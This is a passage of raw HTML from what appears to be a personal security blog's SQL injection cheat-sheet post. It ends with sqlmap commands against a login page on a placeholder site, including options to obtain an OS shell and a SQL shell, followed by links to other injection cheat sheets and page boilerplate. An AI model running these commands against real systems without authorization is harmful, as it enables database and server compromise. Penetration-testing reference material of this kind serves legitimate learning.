+sqlmap --dbms<span class="o">=</span>mysql -u <span class="s2">&#34;http://testsite.com/login.php&#34;</span> --os-shell
+<span class="o">[</span>Get OS Shel<span class="o">]</span>
+sqlmap --dbms<span class="o">=</span>mysql -u <span class="s2">&#34;http://testsite.com/login.php&#34;</span> --sql-shell
+<span class="o">[</span>Get SQL Shell<span class="o">]</span>
+sqlmap -r login-chris.request --level <span class="m">5</span> --risk <span class="m">3</span> --batch --string <span class="s2">&#34;Wrong identification(query corect)&#34;</span>
+<span class="o">[</span>best<span class="o">]</span>
+</code></pre></div><h1 id="reference">Reference</h1>
+<p>-<a href="https://sqlwiki.netspi.com/#mysql" target="_blank" rel="noopener noreffer ">https://sqlwiki.netspi.com/#mysql</a><br>
+-<a href="https://sites.google.com/a/michaelboman.org/www-michaelboman-org/books/sql-injection-cheat-sheet-oracle" target="_blank" rel="noopener noreffer ">https://sites.google.com/a/michaelboman.org/www-michaelboman-org/books/sql-injection-cheat-sheet-oracle</a><br>
+-<a href="https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/" target="_blank" rel="noopener noreffer ">https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/</a><br>
+-<a href="https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/" target="_blank" rel="noopener noreffer ">https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/</a></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-06-08</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://tranquac.github.io/posts/sql/" data-title="SQL" data-via="quactv1" data-hashtags="SQL"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://tranquac.github.io/posts/sql/" data-hashtag="SQL"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://tranquac.github.io/posts/sql/" data-title="SQL"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://tranquac.github.io/posts/sql/" data-title="SQL"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://tranquac.github.io/posts/sql/" data-title="SQL"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/sql/">SQL</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/xxe/" class="prev" rel="prev" title="XXE"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>XXE</a>
+            <a href="/posts/linux-backdoors/" class="next" rel="next" title="Linux Backdoors">Linux Backdoors<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">quactv</a></span>&nbsp;|&nbsp;<span class="license">Infosec</span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+                    <span class="icp">Security</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
